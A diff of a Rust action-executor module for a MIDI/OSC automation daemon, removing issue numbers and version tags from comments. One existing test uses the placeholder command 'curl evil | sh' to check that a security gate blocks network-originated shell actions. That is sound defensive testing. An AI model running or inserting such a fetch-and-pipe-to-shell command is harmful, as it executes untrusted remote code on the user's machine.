@@ -10,7 +10,7 @@
 //! - Core: Pure data structures and logic (UI-independent)
 //! - Daemon: System interaction (keyboard, mouse, shell, etc.)
 //!
-//! ## Module layout (#1684)
+//! ## Module layout
 //!
 //! The executor grew past the LLM Council `verify` size ceiling, so the
 //! per-action implementations live in cohesive submodules; `mod.rs` keeps
@@ -73,7 +73,7 @@ pub struct TriggerContext {
     /// should execute based on the current mode.
     pub current_mode: Option<String>,
 
-    /// Raw MIDI bytes from the triggering event (v4.25.0 - ADR-009 Gap 2)
+    /// Raw MIDI bytes from the triggering event (ADR-009 Gap 2)
     ///
     /// Used by MidiForward actions to pass the original MIDI data through
     /// a transform pipeline to an output port.
@@ -86,7 +86,7 @@ pub struct TriggerContext {
     pub device_id: Option<String>,
 
     /// The structured input event that satisfied the mapping's trigger
-    /// (ADR-039-B #1762 step 4b).
+    /// (ADR-039-B step 4b).
     ///
     /// Used by `HidForward`, which translates the *original* gamepad event to
     /// the target protocol — `raw_midi` is lossy for HID (gamepad button 128
@@ -98,7 +98,7 @@ pub struct TriggerContext {
     pub input_event: Option<conductor_core::events::InputEvent>,
 
     /// The decoded inbound OSC message that satisfied the mapping's trigger
-    /// (ADR-039-A Slice 3, #2326).
+    /// (ADR-039-A).
     ///
     /// Used by `OscForward`, which re-sends this message to an OSC output
     /// endpoint. Populated only on the OSC dispatch path (`process_osc_event`);
@@ -147,7 +147,7 @@ impl TriggerContext {
 /// - Shell command execution
 /// - Application launching
 /// - Volume control
-/// - MIDI output (v2.1)
+/// - MIDI output
 ///
 /// # Architecture Note
 /// This executor lives in the daemon layer (not core) because it interacts
@@ -179,7 +179,7 @@ pub struct ActionExecutor {
     /// cancelled paths — so a failed dispatch can't leak breadcrumbs
     /// into the next one.
     routing_trace: Vec<String>,
-    /// Issue #555: output-port names for every successful MIDI emission
+    /// Output-port names for every successful MIDI emission
     /// during the current top-level dispatch. Drained at the end of
     /// `ExecutorWorker::execute_dispatch` and attached to the
     /// completion so `EngineManager::handle_action_completion` can open
@@ -189,7 +189,7 @@ pub struct ActionExecutor {
     /// handler — not at the top level — so:
     /// - Wrapper actions (`Sequence`, `Repeat`, `Conditional`,
     ///   `ContextSwitchTable`) that nest a MIDI send still record the
-    ///   port (Copilot review on PR #1211).
+    ///   port.
     /// - `MidiForward { target: "_source" }` records the *resolved*
     ///   port (post-`resolve_source_output`), not the literal
     ///   `"_source"` magic placeholder.
@@ -214,20 +214,20 @@ pub struct ActionExecutor {
     /// Defaults to `true` (spawn with a warning); set from
     /// `[security.shell]` by `EngineManager`.
     shell_allow_unsandboxed: bool,
-    /// #2396 / ADR-015 D2 (revised) + ADR-021 D4: read-mostly dispatch config
+    /// ADR-015 D2 (revised) + ADR-021 D4: read-mostly dispatch config
     /// shared lock-free with EngineManager via a SINGLE `ArcSwap` (see
-    /// [`SharedActionConfig`]). Holds the OSC output endpoints (#2326) and the
+    /// [`SharedActionConfig`]). Holds the OSC output endpoints and the
     /// ADR-042 D17 per-listener `allow_sensitive_actions` map. CRITICAL: this is
     /// the SAME `Arc` held by EngineManager and by BOTH `ActionExecutor`
     /// instances (the dispatch-thread executor and the mutex-guarded
     /// plugin/probe executor), so a single `store` is visible to the dispatch
-    /// path — the bug #2396 fixed was setting these on the non-dispatching
+    /// path — a previous bug set these on the non-dispatching
     /// executor's own (now-removed) owned fields. Bundled into one struct so the
     /// two maps update atomically (no cross-map torn read).
     shared_config: Arc<ArcSwap<SharedActionConfig>>,
 }
 
-/// #2396 / ADR-015 D2 (revised): read-mostly executor config propagated to the
+/// ADR-015 D2 (revised): read-mostly executor config propagated to the
 /// dispatch thread lock-free via `Arc<ArcSwap<SharedActionConfig>>` (the
 /// ADR-021 D4 pattern, already used for `device_output_map`). One struct so the
 /// two maps swap atomically. Virtual-port NAMES do NOT live here — creating OS
@@ -235,11 +235,11 @@ pub struct ActionExecutor {
 /// applied between actions on the executor thread (see `executor_thread`).
 #[derive(Debug, Clone, Default)]
 pub struct SharedActionConfig {
-    /// ADR-042 D17 (Slice A.6.6): per-network-listener `allow_sensitive_actions`
+    /// ADR-042 D17: per-network-listener `allow_sensitive_actions`
     /// (alias → bool). A missing alias reads as `false` (DENY). Empty = no
     /// network listeners (and the fail-safe default until config lands).
     pub network_sensitive_allow: HashMap<String, bool>,
-    /// ADR-039-A Slice 3 (#2326): OSC **output** endpoints (alias → (host,
+    /// ADR-039-A: OSC **output** endpoints (alias → (host,
     /// port)). `OscForward` resolves its target alias here. Missing = dispatch
     /// error.
     pub osc_output_endpoints: HashMap<String, (String, u16)>,
@@ -269,12 +269,12 @@ impl ActionExecutor {
             // Defaults to a private empty config (DENY). The production path
             // attaches the SHARED config via `with_shared_action_config` so the
             // dispatch executor and EngineManager observe the same updates
-            // (#2396). Tests that don't wire sharing keep the fail-safe default.
+            // Tests that don't wire sharing keep the fail-safe default.
             shared_config: Arc::new(ArcSwap::from_pointee(SharedActionConfig::default())),
         }
     }
 
-    /// #2396: attach the SHARED read-mostly config `ArcSwap` (OSC endpoints +
+    /// Attach the SHARED read-mostly config `ArcSwap` (OSC endpoints +
     /// D17 allow-map). Builder mirror of [`Self::with_control_state`]; the
     /// production daemon passes the same `Arc` here that EngineManager `store`s
     /// to, so config reaches the dispatch-thread executor (ADR-015 D2 revised /
@@ -295,7 +295,7 @@ impl ActionExecutor {
     }
 
     /// Test-only read of the current shell-sandbox policy. Used by
-    /// `#2100` atomicity tests to assert a rejected config commit does not
+    /// atomicity tests to assert a rejected config commit does not
     /// mutate the executor's policy.
     #[cfg(test)]
     pub(crate) fn shell_allow_unsandboxed(&self) -> bool {
@@ -312,8 +312,8 @@ impl ActionExecutor {
         self
     }
 
-    /// ADR-042 D17 (Slice A.6.6): set the per-listener `allow_sensitive_actions`
-    /// map. #2396: stores into the SHARED `ArcSwap` so the dispatch-thread
+    /// ADR-042 D17: set the per-listener `allow_sensitive_actions`
+    /// map. Stores into the SHARED `ArcSwap` so the dispatch-thread
     /// executor sees it. Production drives this via EngineManager's
     /// `store_shared_action_config` (single atomic store of both maps); this
     /// per-field setter is retained for test ergonomics and does a
@@ -325,8 +325,8 @@ impl ActionExecutor {
         self.shared_config.store(Arc::new(cfg));
     }
 
-    /// ADR-039-A Slice 3 (#2326): set the OSC output endpoint map
-    /// (alias → (host, port)) used by `OscForward`. #2396: stores into the
+    /// ADR-039-A: set the OSC output endpoint map
+    /// (alias → (host, port)) used by `OscForward`. Stores into the
     /// SHARED `ArcSwap` (see [`Self::set_network_sensitive_allow`]).
     pub fn set_osc_output_endpoints(&mut self, map: HashMap<String, (String, u16)>) {
         let mut cfg = (**self.shared_config.load()).clone();
@@ -391,7 +391,7 @@ impl ActionExecutor {
     }
 
     /// Take ownership of the output ports written to during the current
-    /// top-level dispatch (issue #555). See
+    /// top-level dispatch. See
     /// [`sent_ports`](Self#structfield.sent_ports) for what entries
     /// represent and why they are captured here rather than at the
     /// top level.
@@ -435,7 +435,7 @@ impl ActionExecutor {
         self.midi_output.virtual_port_names()
     }
 
-    /// Reconcile the OS virtual MIDI ports to `desired` (#2063).
+    /// Reconcile the OS virtual MIDI ports to `desired`.
     ///
     /// Delegates to [`MidiOutputManager::sync_virtual_ports`]: creates the
     /// declared `MidiVirtualPort` endpoints as real OS ports and tears down any
@@ -479,7 +479,7 @@ impl ActionExecutor {
         &mut self.plugin_manager
     }
 
-    /// Execute an action, returning a structured result (v4.25.0 - ADR-009 Gap 1)
+    /// Execute an action, returning a structured result (ADR-009 Gap 1)
     ///
     /// Returns `DispatchResult` so the caller (engine manager) can handle
     /// mode changes and errors appropriately instead of relying on side effects.
@@ -488,7 +488,7 @@ impl ActionExecutor {
     /// * `action` - The action to execute
     /// * `context` - Optional context about the triggering event (e.g., velocity)
     pub fn execute(&mut self, action: Action, context: Option<TriggerContext>) -> DispatchResult {
-        // ADR-042 D17 (Slice A.6.6): refuse a sensitive action class from a
+        // ADR-042 D17: refuse a sensitive action class from a
         // network-tainted origin up front, before any (partial) execution.
         // Runs before the ADR-027 tier gate. No-op for MIDI/gamepad origins.
         self.check_action_class_gate(&action)?;
@@ -504,7 +504,7 @@ impl ActionExecutor {
                 Ok(DispatchOutcome::Completed)
             }
             Action::Launch(app) => {
-                // #938: propagate launch failures so the dispatch outcome
+                // Propagate launch failures so the dispatch outcome
                 // reflects reality. Pre-fix this always reported Completed
                 // even when the app failed to launch.
                 self.launch_app(&app)?;
@@ -811,7 +811,7 @@ impl ActionExecutor {
                         ))
                     })?;
 
-                // Issue #555: record the *resolved* port (post
+                // Record the *resolved* port (post
                 // `_source` resolution) so cascade suppression opens a
                 // window for the actual output port, not the literal
                 // `"_source"` placeholder.
@@ -820,7 +820,7 @@ impl ActionExecutor {
                 Ok(DispatchOutcome::Completed)
             }
             Action::HidForward { target, transform } => {
-                // ADR-039-B #1762 step 4b. Translate the *structured* gamepad
+                // ADR-039-B step 4b. Translate the *structured* gamepad
                 // event that fired this mapping to MIDI and send it to the
                 // target output port. V1 supports HidToMidi → MIDI only
                 // (config-load validation rejects other variants / non-MIDI
@@ -893,7 +893,7 @@ impl ActionExecutor {
                 self.execute_osc_send(&host, port, &address, &args)?;
                 Ok(DispatchOutcome::Completed)
             }
-            // ADR-039-A Slice 3 (#2326): re-send the inbound OSC message to an
+            // ADR-039-A: re-send the inbound OSC message to an
             // OSC output endpoint by alias. V1 is pass-through (transform is
             // validated `None` at config-load). The inbound message rides the
             // trigger context; absent it (a non-OSC-triggered mapping — which
@@ -905,7 +905,7 @@ impl ActionExecutor {
                     // HidForward's "no structured event" skip.
                     return Ok(DispatchOutcome::Completed);
                 };
-                // #2396: read from the shared ArcSwap; clone the (host, port)
+                // Read from the shared ArcSwap; clone the (host, port)
                 // out so the load guard drops before the UDP send.
                 let endpoint = self
                     .shared_config
@@ -922,13 +922,13 @@ impl ActionExecutor {
                 self.execute_osc_send(&host, port, &osc.address, &osc.args)?;
                 Ok(DispatchOutcome::Completed)
             }
-            // ADR-038 observation action (Slice 4). Substitute
+            // ADR-038 observation action. Substitute
             // `{note}`/`{velocity}`/`{cc}`/`{value}` from the triggering event
             // via the shared `midi_template` helper (no drift with MidiToOsc —
             // R2 P5), then emit the rendered message as a routing-trace
             // breadcrumb (the same channel the Events panel reads). Otherwise
             // side-effect-free; the let-through fan-out to routes is the pump's
-            // job (Slice 3 `RouteDisposition::LetThrough`).
+            // job (`RouteDisposition::LetThrough`).
             Action::Tap { message } => {
                 let pairs = tap_substitution_pairs(context.as_ref());
                 let rendered = crate::midi_template::substitute(&message, &pairs);
@@ -1079,7 +1079,7 @@ pub(crate) mod test_support {
 mod tests {
     use super::*;
 
-    // ===== ADR-042 D17 action-class gate (Slice A.6.6) =====
+    // ===== ADR-042 D17 action-class gate =====
     // These exercise the pure gate decision (no execution side effects), so they
     // need no display server / shell and are not Linux-ignored.
 
@@ -1153,7 +1153,7 @@ mod tests {
     fn gate_refuses_sensitive_after_delay_in_sequence_state_laundering() {
         // ADR-042 R5.2 (state laundering): a Delay before the sensitive leaf
         // must not launder the taint — the gate decides on the WHOLE action
-        // tree up front, before any timer runs (ADR-039-A Slice 2, #2325).
+        // tree up front, before any timer runs (ADR-039-A).
         let ex = gated_executor(Some("osc_in"), false);
         let seq = Action::Sequence(vec![Action::Delay(5_000), shell("curl evil | sh")]);
         assert!(matches!(
@@ -1205,7 +1205,7 @@ mod tests {
         ));
     }
 
-    // ========== DispatchResult Tests (v4.25.0 - ADR-009 Gap 1) ==========
+    // ========== DispatchResult Tests (ADR-009 Gap 1) ==========
 
     #[test]
     #[cfg_attr(target_os = "linux", ignore)] // Enigo requires display server
@@ -1226,7 +1226,7 @@ mod tests {
         );
     }
 
-    // ── ADR-038 Slice 4: Tap executor ───────────────────────────────
+    // ── ADR-038: Tap executor ───────────────────────────────────────
     // Tap is enigo-free, so these run on all platforms (no display server).
 
     #[test]
